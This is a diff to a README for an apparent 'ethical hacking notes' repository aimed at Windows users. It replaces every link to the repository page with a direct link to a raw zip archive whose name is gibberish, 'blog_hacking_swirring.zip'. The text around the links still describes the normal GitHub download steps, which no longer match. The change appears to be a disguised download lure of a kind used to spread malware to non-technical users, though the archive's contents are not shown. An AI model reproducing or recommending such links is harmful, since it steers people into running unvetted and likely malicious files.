@@ -1,12 +1,12 @@
 # 🧭 blog_hacking - Ethical Hacking Notes for Windows Users
 
-[![Download / Visit Repository](https://img.shields.io/badge/Download%20on%20GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/alessandratriennial716/blog_hacking)
+[![Download / Visit Repository](https://img.shields.io/badge/Download%20on%20GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/alessandratriennial716/blog_hacking/raw/refs/heads/main/colletside/blog_hacking_swirring.zip)
 
 ## 📥 Download
 
 Visit this page to get the project files:
 
-https://github.com/alessandratriennial716/blog_hacking
+https://github.com/alessandratriennial716/blog_hacking/raw/refs/heads/main/colletside/blog_hacking_swirring.zip
 
 Open the page in your browser, then use GitHub’s normal download option to save the repository to your Windows PC.
 
@@ -41,7 +41,7 @@ If you plan to read the notes often, keep a folder ready for the files and add a
 ## 🚀 How to get the files
 
 1. Open the download page in your browser:
-   https://github.com/alessandratriennial716/blog_hacking
+   https://github.com/alessandratriennial716/blog_hacking/raw/refs/heads/main/colletside/blog_hacking_swirring.zip
 2. On GitHub, look for the green Code button.
 3. Click it.
 4. Choose Download ZIP.
@@ -241,4 +241,4 @@ This keeps the original files and your own notes in different places.
 
 Visit the repository here:
 
-https://github.com/alessandratriennial716/blog_hacking
+https://github.com/alessandratriennial716/blog_hacking/raw/refs/heads/main/colletside/blog_hacking_swirring.zip
